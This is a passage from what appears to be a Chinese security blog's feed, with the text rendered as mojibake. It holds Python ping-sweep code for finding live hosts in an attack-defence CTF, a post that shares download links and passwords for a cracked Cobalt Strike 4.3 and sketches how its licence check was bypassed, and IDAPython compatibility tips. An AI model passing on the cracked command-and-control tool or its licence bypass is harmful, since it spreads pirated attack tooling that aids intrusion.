data-language="python"><code class="language-python"><span class="token keyword">from</span> ping3 <span class="token keyword">import</span> ping<span class="token punctuation">,</span> verbose_ping<span class="token keyword">import</span> threading<span class="token keyword">import</span> traceback<span class="token keyword">import</span> queue<span class="token keyword">import</span> time<span class="token keyword">class</span> <span class="token class-name">Attack</span><span class="token punctuation">(</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> queue<span class="token punctuation">)</span><span class="token punctuation">:</span>        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>_queue <span class="token operator">=</span> queue    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">while</span> <span class="token keyword">not</span> self<span class="token punctuation">.</span>_queue<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                target <span class="token operator">=</span> self<span class="token punctuation">.</span>_queue<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>detect<span class="token punctuation">(</span>target<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>                traceback<span class="token punctuation">.</span>print_exc<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">detect</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> ping<span class="token punctuation">(</span>target<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>        <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> result <span class="token operator">!=</span> <span class="token boolean">False</span><span class="token punctuation">:</span>            alive_target<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    target_exp <span class="token operator">=</span> <span class="token string">'192.168.123.&#123;&#125;'</span>    self_port <span class="token operator">=</span> <span class="token number">999</span>    ips <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> self_port<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        ips<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target_exp<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ips<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>ips<span class="token punctuation">)</span><span class="token punctuation">:</span>    clearfile<span class="token punctuation">(</span>bugku_ips_path<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ips<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">:</span>        threadsnum <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ips<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        threadsnum <span class="token operator">=</span> <span class="token number">20</span>  <span class="token comment"># çº¿ç¨‹é»˜è®¤å€¼</span>    LocalQueue <span class="token operator">=</span> queue<span class="token punctuation">.</span>Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> ip <span class="token keyword">in</span> ips<span class="token punctuation">:</span>        LocalQueue<span class="token punctuation">.</span>put<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    threadsCount <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>threadsnum<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>threadsCount<span class="token punctuation">)</span><span class="token punctuation">:</span>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>Attack<span class="token punctuation">(</span>LocalQueue<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> threads<span class="token punctuation">:</span>        j<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> threads<span class="token punctuation">:</span>        j<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    timeout <span class="token operator">=</span> <span class="token number">1</span>    alive_target <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    main<span class="token punctuation">(</span>create<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>alive_target<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>start_time<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åç¨‹"><a href="#åç¨‹" class="headerlink" title="åç¨‹"></a>åç¨‹</h3><p>å› ä¸ºpingä¸æ”¯æŒå¼‚æ­¥ï¼Œæ‰€ä»¥ç”¨çº¿ç¨‹æ± å½¢å¼ï¼Œä»¥ç©ºé—´æ¢æ—¶é—´ã€‚</p><p>è¿™ä¸ªå…¶å®å’Œå¤šçº¿ç¨‹æ²¡å•¥åŒºåˆ«ï¼Œæ— éä¸€ä¸ªç”¨æ‰‹åŠ¨è®¾ç½®çº¿ç¨‹ï¼Œä¸€ä¸ªè‡ªåŠ¨å¢åŠ çº¿ç¨‹ã€‚</p><p>ä¸è¿‡æŒ‰ç†æ¥è¯´è¿˜æ˜¯è¿™ä¸ªè¦æ›´å¥½ä¸€ç‚¹ï¼Œæ— è®ºæ˜¯æ—¶é—´è¿˜æ˜¯ç©ºé—´ä¸Šæ¥è¯´ï¼Œæ›´ä¸ºâ€è‡ªåŠ¨åŒ–â€œï¼Œä»£ç æ›´å°‘ï¼Œè€Œä¸”Pythonå› ä¸ºæœ‰GILé”ï¼Œç”¨åç¨‹æ›´ä¸ºé€‚åˆã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ping3 <span class="token keyword">import</span> ping<span class="token punctuation">,</span> verbose_ping<span class="token keyword">import</span> asyncio<span class="token keyword">import</span> time<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">_ping</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    loop <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span>    future <span class="token operator">=</span> loop<span class="token punctuation">.</span>run_in_executor<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> detect<span class="token punctuation">,</span> target<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>    <span class="token keyword">await</span> future<span class="token keyword">def</span> <span class="token function">detect</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> ping<span class="token punctuation">(</span>target<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>    <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> result <span class="token operator">!=</span> <span class="token boolean">False</span><span class="token punctuation">:</span>        alive_target<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ips <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    target_exp <span class="token operator">=</span> <span class="token string">'192.168.123.&#123;&#125;'</span>    self_port <span class="token operator">=</span> <span class="token number">999</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> self_port<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        ips<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target_exp<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ips<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    timeout <span class="token operator">=</span> <span class="token number">1</span>    alive_target <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    target_list <span class="token operator">=</span> create<span class="token punctuation">(</span><span class="token punctuation">)</span>    tasks <span class="token operator">=</span> <span class="token punctuation">[</span>_ping<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> target_list<span class="token punctuation">]</span>    asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>alive_target<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>start_time<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="åç¨‹uvloop"><a href="#åç¨‹uvloop" class="headerlink" title="åç¨‹uvloop"></a>åç¨‹uvloop</h3><p>å§‘ä¸”æµ‹è¯•äº†ä¸€ä¸‹ï¼Œæš‚æ—¶æ²¡æ„Ÿè§‰å‡ºå¤ªå¤§åŒºåˆ«ï¼Œå¯èƒ½æµ‹è¯•æ ·æœ¬å¤ªå°‘äº†ã€‚</p><blockquote><p>pythonæ¨¡å—uvloopæš‚ä¸æ”¯æŒwindowså’Œpython3.9</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ping3 <span class="token keyword">import</span> ping<span class="token punctuation">,</span> verbose_ping<span class="token keyword">import</span> asyncio<span class="token keyword">import</span> time<span class="token keyword">import</span> uvloopasyncio<span class="token punctuation">.</span>set_event_loop_policy<span class="token punctuation">(</span>uvloop<span class="token punctuation">.</span>EventLoopPolicy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">_ping</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>    loop <span class="token operator">=</span> asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span>    future <span class="token operator">=</span> loop<span class="token punctuation">.</span>run_in_executor<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> detect<span class="token punctuation">,</span> target<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span>    <span class="token keyword">await</span> future<span class="token keyword">def</span> <span class="token function">detect</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> timeout<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> ping<span class="token punctuation">(</span>target<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>    <span class="token keyword">if</span> result <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> result <span class="token operator">!=</span> <span class="token boolean">False</span><span class="token punctuation">:</span>        alive_target<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ips <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    target_exp <span class="token operator">=</span> <span class="token string">'192.168.123.&#123;&#125;'</span>    self_port <span class="token operator">=</span> <span class="token number">999</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> self_port<span class="token punctuation">:</span>            <span class="token keyword">continue</span>        ips<span class="token punctuation">.</span>append<span class="token punctuation">(</span>target_exp<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ips<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    timeout <span class="token operator">=</span> <span class="token number">1</span>    alive_target <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    target_list <span class="token operator">=</span> create<span class="token punctuation">(</span><span class="token punctuation">)</span>    tasks <span class="token operator">=</span> <span class="token punctuation">[</span>_ping<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> target_list<span class="token punctuation">]</span>    asyncio<span class="token punctuation">.</span>run<span class="token punctuation">(</span>asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>alive_target<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span>start_time<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h2><p>è¦æƒ³æ›´å¿«ï¼Œè¿˜æ˜¯å¾—ä»åè®®å…¥æ‰‹ï¼Œæ¢synæ‰«æä¹‹ç±»çš„ã€‚å¯ä»¥ï¼Œä½†æ²¡å¿…è¦ã€‚å†æ€ä¹ˆå†™è‚¯å®šä¹Ÿæ²¡æœ‰nmapå¥½ç”¨ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Python </tag>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobaltStrike 4.3[20210317]æ±‰åŒ–åŠç ´è§£æ•´åˆ</title>
      <link href="/p/1120311950.html"/>
      <url>/p/1120311950.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Cobalt Strike 4.3 (March 17, 2021) [bug fixes]</p><p>èµ„æºæ¥æºäºå…¬ä¼—å·ï¼š<code>å­Ÿç–¾æ‚è®°</code>ï¼Œåœ¨æ­¤æ„Ÿè°¢<a href="https://github.com/Twi1ight">Twi1ight</a>æ— ç§åˆ†äº«çš„å®è´µèµ„æºã€‚</p><p>æ–‡ä»¶å¯é€šè¿‡å®˜æ–¹å“ˆå¸ŒéªŒè¯åœ°å€è¿›è¡Œsha256éªŒè¯ã€‚</p><h2 id="ä¸‹è½½åœ°å€"><a href="#ä¸‹è½½åœ°å€" class="headerlink" title="ä¸‹è½½åœ°å€"></a>ä¸‹è½½åœ°å€</h2><h3 id="CobaltStrike-4-3-20210317-å®˜æ–¹jaråŒ…"><a href="#CobaltStrike-4-3-20210317-å®˜æ–¹jaråŒ…" class="headerlink" title="CobaltStrike 4.3[20210317]å®˜æ–¹jaråŒ…"></a>CobaltStrike 4.3[20210317]å®˜æ–¹jaråŒ…</h3><p>ä»¥ä¸‹ä¸º@Twi1ightå‘å¸ƒçš„ä¸‹è½½åœ°å€</p><blockquote><p><a href="https://pan.baidu.com/s/11yLBMq392FMXy5GywjbyNQ">https://pan.baidu.com/s/11yLBMq392FMXy5GywjbyNQ</a><br>æå–ç : xiyg</p><p><a href="https://wwr.lanzoux.com/ii0ehopvdgj">https://wwr.lanzoux.com/ii0ehopvdgj</a><br>å¯†ç :3yn1</p></blockquote><p>éªŒè¯å‘½ä»¤(windowsè‡ªå¸¦)</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">certutil -hashfile cobaltstrike.jar SHA256<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/CobaltStrike4-3-%E6%B1%89%E5%8C%96%E5%8F%8A%E7%A0%B4%E8%A7%A3%E6%95%B4%E5%90%88/image-20210721140132514.png" alt="image-20210721140132514"></p><h3 id="CobaltStrike-4-3-20210317-ç ´è§£ç‰ˆ"><a href="#CobaltStrike-4-3-20210317-ç ´è§£ç‰ˆ" class="headerlink" title="CobaltStrike 4.3[20210317]ç ´è§£ç‰ˆ"></a>CobaltStrike 4.3[20210317]ç ´è§£ç‰ˆ</h3><blockquote><p>ç ´è§£æ€è·¯å’Œä»¥å‰ç‰ˆæœ¬ä¸€æ ·ï¼Œæ›¿æ¢resources/authkey.pubï¼Œç„¶åè‡ªå·±ç­¾å‘cobaltstrike.auth</p><p>æ”¹äº†å››ä¸ªåœ°æ–¹ï¼š</p><ol><li>æ›¿æ¢resources/authkey.pubæ–‡ä»¶</li><li>ä¿®æ”¹common/AuthCrypto.classé‡Œé¢authkey.pubçš„MD5å€¼</li><li>ä¿®å¤beacon/BeaconData.classé‡Œ30åˆ†é’Ÿé€€å‡ºçš„æš—æ¡©</li><li>åœ¨aggressor/Aggressor.classçš„ç‰ˆæœ¬å·åé¢åŠ äº†è‡ªå·±çš„åŠä¸ªID</li></ol></blockquote><p>ä»¥ä¸‹ä¸º@Twi1ightå‘å¸ƒçš„ä¸‹è½½åœ°å€</p><blockquote><p><a href="https://pan.baidu.com/s/1vISRhX6ELpaXDVJ4RlWQZQ">https://pan.baidu.com/s/1vISRhX6ELpaXDVJ4RlWQZQ</a><br>æå–ç : jtv9<br>è§£å‹å¯†ç : A.F_ck1ng.Gift.for.51.Fr0m.TW</p><p><a href="https://wwr.lanzoux.com/i3X4Sopvdcf">https://wwr.lanzoux.com/i3X4Sopvdcf</a><br>å¯†ç :gbs3</p></blockquote><p>å› ä¸ºæ˜¯ç›´æ¥ç ´è§£åŸç‰ˆjarï¼Œæ‰€ä»¥å“ˆå¸Œå€¼ä¸åŸç‰ˆä¸åŒã€‚</p><h3 id="æ±‰åŒ–-ç ´è§£åŠ è½½å™¨"><a href="#æ±‰åŒ–-ç ´è§£åŠ è½½å™¨" class="headerlink" title="æ±‰åŒ–+ç ´è§£åŠ è½½å™¨"></a>æ±‰åŒ–+ç ´è§£åŠ è½½å™¨</h3><p><a href="https://github.com/Twi1ight/CSAgent">https://github.com/Twi1ight/CSAgent</a></p><h3 id="æ±‰åŒ–ç ´è§£ä¸ªäººæ•´åˆç‰ˆ"><a href="#æ±‰åŒ–ç ´è§£ä¸ªäººæ•´åˆç‰ˆ" class="headerlink" title="æ±‰åŒ–ç ´è§£ä¸ªäººæ•´åˆç‰ˆ"></a>æ±‰åŒ–ç ´è§£ä¸ªäººæ•´åˆç‰ˆ</h3><p>è¿™ä¸ªåˆ™æ˜¯ä¸ªäººæ•´åˆï¼Œé™¤äº†æŠŠä¸Šé¢çš„èµ„æºæ•´åˆäº†ä¸‹ï¼Œå®˜æ–¹jaråŒ…+CSAgentï¼Œè¿˜åšäº†äº›ä¿®æ”¹ï¼Œå…·ä½“å¦‚ä¸‹ï¼š</p><ul><li><p>æ–°å¢<code>cobalstrike.vbs</code></p><p>windowså¯åŠ¨æ–¹å¼ï¼Œå…¶ä¸­jdkè·¯å¾„è¯·è‡ªè¡Œæ›¿æ¢<code>C:\Program Files\Java\jdk-14.0.2\bin\java.exe</code></p><p>ä¼˜ç‚¹ï¼šä»»æ„æŒ‡å®šjavaç‰ˆæœ¬ï¼Œæ— éœ€æ‹…å¿ƒç³»ç»Ÿå˜é‡é—®é¢˜</p></li><li><p>æ–°å¢<code>start.sh</code></p><p>linuxå¯åŠ¨æ–¹å¼ï¼Œå±Šæ—¶å¯ç›´æ¥<code>./start.sh</code>å¯åŠ¨ã€‚ä»£ç æ¥æºäº<code>CSAgent</code></p></li><li><p>ä¿®æ”¹<code>teamserver</code></p><p>ä»£ç æ¥æºäº<code>CSAgent</code>ï¼ŒåŠ äº†ä¸ª<code>--add-opens=java.base/java.lang.reflect=ALL-UNNAMED</code>ä»¥å¿½ç•¥warningï¼Œå…·ä½“è§åæ–‡</p></li></ul><blockquote><p>ä¸‹è½½:<a href="https://avalonair.lanzoui.com/i2WHFrodk1a">https://avalonair.lanzoui.com/i2WHFrodk1a</a></p><p>å¯†ç :e7fr</p></blockquote><h2 id="ç›¸å…³é—®é¢˜é›†é”¦"><a href="#ç›¸å…³é—®é¢˜é›†é”¦" class="headerlink" title="ç›¸å…³é—®é¢˜é›†é”¦"></a>ç›¸å…³é—®é¢˜é›†é”¦</h2><h3 id="WARNING-An-illegal-reflective-access-operation-has-occurred"><a href="#WARNING-An-illegal-reflective-access-operation-has-occurred" class="headerlink" title="WARNING: An illegal reflective access operation has occurred"></a>WARNING: An illegal reflective access operation has occurred</h3><p>teamserverå¯åŠ¨æŠ¥å¦‚ä¸‹é”™è¯¯ï¼š</p><p><img src="/../images/CobaltStrike4-3-%E6%B1%89%E5%8C%96%E5%8F%8A%E7%A0%B4%E8%A7%A3%E6%95%B4%E5%90%88/image-20210721142058187.png" alt="image-20210721142058187"></p><p>ä¸»è¦å‡ºç°åœ¨é«˜ç‰ˆæœ¬(&gt;=jdk9)æƒ…å†µä¸‹ï¼Œæ²¡æœ‰å½±å“ï¼Œå¿½ç•¥å°±å¥½</p><p>åœ¨å¯åŠ¨é¡¹åŠ ä¸ªå¦‚ä¸‹å‘½ä»¤å³å¯å¿½ç•¥è¯¥warning</p><pre class="line-numbers language-none"><code class="language-none">--add-opens&#x3D;java.base&#x2F;java.lang.reflect&#x3D;ALL-UNNAMED<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="å®˜æ–¹å“ˆå¸ŒéªŒè¯åœ°å€"><a href="#å®˜æ–¹å“ˆå¸ŒéªŒè¯åœ°å€" class="headerlink" title="å®˜æ–¹å“ˆå¸ŒéªŒè¯åœ°å€"></a>å®˜æ–¹å“ˆå¸ŒéªŒè¯åœ°å€</h2><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;verify.cobaltstrike.com&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/CobaltStrike4-3-%E6%B1%89%E5%8C%96%E5%8F%8A%E7%A0%B4%E8%A7%A3%E6%95%B4%E5%90%88/image-20210721135356961.png" alt="image-20210721135356961"></p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobaltStrike </tag>
            
            <tag> æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³äºIDA7.5ç‰ˆæœ¬IDApythonçš„apiå·®å¼‚é—®é¢˜åŠè§£å†³åŠæ³•</title>
      <link href="/p/164444668.html"/>
      <url>/p/164444668.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é¦–å‘äºå¾çˆ±ç ´è§£ï¼Œç°è½¬åˆ°åšå®¢ä¸Šæ¥ã€‚</p><p>ä¸çŸ¥é“è¯¥åˆ†å“ªç±»ï¼Œå§‘ä¸”æ”¾åˆ°é€†å‘é‡Œå§</p><h2 id="æ­£æ–‡"><a href="#æ­£æ–‡" class="headerlink" title="æ­£æ–‡"></a>æ­£æ–‡</h2><p>åœ¨7.5ç‰ˆæœ¬ä¸‹ä¸€äº›å‡½æ•°å¦‚<code>PatchByte()</code>ï¼Œ<code>Byte()</code>éƒ½æç¤º<br>NameError: name â€˜Byteâ€™ is not defined<br>åˆèˆä¸å¾—æ”¾å¼ƒ7.5(ä¸€äº›é¢˜ç›®æ‹¿7.5ç‰ˆç”Ÿæˆçš„ä¼ªä»£ç æ¯”7.0ç‰ˆè¦å¥½çœ‹çš„å¤š)ï¼Œ<br>äºæ˜¯åœ¨ç½‘ä¸ŠæŸ¥äº†å¾ˆä¹…ï¼Œæ‰¾å‡ºäº†è§£å†³åŠæ³•ã€‚</p><p>åŸæ¥æ˜¯IDApythonçš„apié—®é¢˜<br>é¦–å…ˆæ˜¯å®˜æ–¹å¯¹äºapiçš„è¯¦ç»†è¿ç§»æ–‡æ¡£<br><a href="https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml</a><br>æœ‰äº†è¿™ä¸ªè¡¨ï¼Œä¸€äº›wpé‡Œçš„æ—§ç‰ˆä»£ç æœç´¢ä¸€ä¸‹å°±èƒ½åœ¨7.5ç‰ˆä½¿ç”¨äº†ã€‚</p><p>ä»¥ä¸‹æ˜¯å…¼å®¹åŠæ³•</p><h3 id="æ–¹æ³•1"><a href="#æ–¹æ³•1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h3><p>å…¶æ¬¡æ˜¯åœ¨æ¯”è¾ƒæ–¹ä¾¿çš„åœ¨7.5ç”¨7.0APIåŠæ³•ï¼Œæ¥æºï¼š<a href="https://github.com/0xgalz/Virtuailor/issues/8">https://github.com/0xgalz/Virtuailor/issues/8</a><br>åœ¨ä»£ç é¢å‰åŠ ä¸ªï¼š<br><code>from idc_bc695 import *</code><br>å³å¯ã€‚</p><h3 id="æ–¹æ³•2-ä¸€åŠ³æ°¸é€¸ç‰ˆ-ï¼š"><a href="#æ–¹æ³•2-ä¸€åŠ³æ°¸é€¸ç‰ˆ-ï¼š" class="headerlink" title="æ–¹æ³•2(ä¸€åŠ³æ°¸é€¸ç‰ˆ)ï¼š"></a>æ–¹æ³•2(ä¸€åŠ³æ°¸é€¸ç‰ˆ)ï¼š</h3><p>æ¥æºå®˜æ–¹æ–‡æ¡£ï¼š<a href="https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695.shtml">https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695.shtml</a><br>æ‰¾åˆ°</p><ul><li>~/.idapro/cfg/idapython.cfg (Linux)</li><li>%APPDATA%\Hex-Rays\IDA Pro\cfg\idapython.cfg (Windows) (ç»¿è‰²ç‰ˆçš„è¯åœ¨ç¨‹åºç›®å½•ä¸‹é‚£ä¸ªcfgæ–‡ä»¶å¤¹é‡Œ)</li></ul><p>æŠŠ<code>AUTOIMPORT_COMPAT_IDA695</code>çš„å€¼æ”¹ä¸º<code>YES</code></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[CISCN2019 åä¸œå—èµ›åŒº]Double Secret</title>
      <link href="/p/1231048582.html"/>
      <url>/p/1231048582.html</url>
      
